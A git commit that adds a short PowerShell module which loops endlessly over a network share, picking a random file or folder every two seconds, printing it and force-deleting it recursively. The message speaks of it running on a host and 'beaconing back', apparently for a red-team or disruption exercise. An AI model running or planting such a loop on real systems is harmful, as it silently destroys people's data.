5ec29c126e1afaf36bb1aa87049f08dca21d4f19
Will Perry <wfperry1@gmail.com>
2022-06-10 17:06:08 -0400

    Updates ManageShare script to always run on host and beacon back file being deleted.

---
+++ ManageShare.psm1
@@ -0,0 +1,14 @@
+﻿function ManageShare {
+	$Share = '<path_to_share>';
+	$Sleep = 2;
+	While($true -eq $true)
+	{
+		$files = Get-ChildItem -Path $Share -Recurse;
+		if ($files.length -gt 0) {
+			$sample = $files | Get-Random -Count 1;
+			Write-Host "${Share}\${sample}";
+			Remove-Item "${Share}\${sample}" -Force -Recurse;
+		}
+		Start-Sleep $Sleep;
+	}
+}
